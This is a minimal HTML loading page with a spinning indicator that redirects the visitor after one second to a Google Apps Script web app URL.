<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Loading...</title>

    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="favicon.ico">

    <style>
        body{
            margin:0;
            height:100vh;
            display:flex;
            justify-content:center;
            align-items:center;
            font-family:Arial,sans-serif;
            background:#ffffff;
        }

        .loader{
            text-align:center;
        }

        .spinner{
            width:50px;
            height:50px;
            border:5px solid #ddd;
            border-top:5px solid #007bff;
            border-radius:50%;
            animation:spin 1s linear infinite;
            margin:0 auto 15px;
        }

        @keyframes spin{
            100%{transform:rotate(360deg);}
        }
    </style>

    <script>
        setTimeout(function () {
            window.location.replace(
                "https://script.google.com/macros/s/AKfycbzGusSlhNoVxHgU_edAWr7H6EzPWuUlaMDJlPzGRP7cHni_zXzXXCdyJVeQUy4nEcIw/exec"
            );
        },1000);
    </script>
</head>
<body>

<div class="loader">
    <div class="spinner"></div>
    <h3>Loading...</h3>
</div>

</body>
</html>
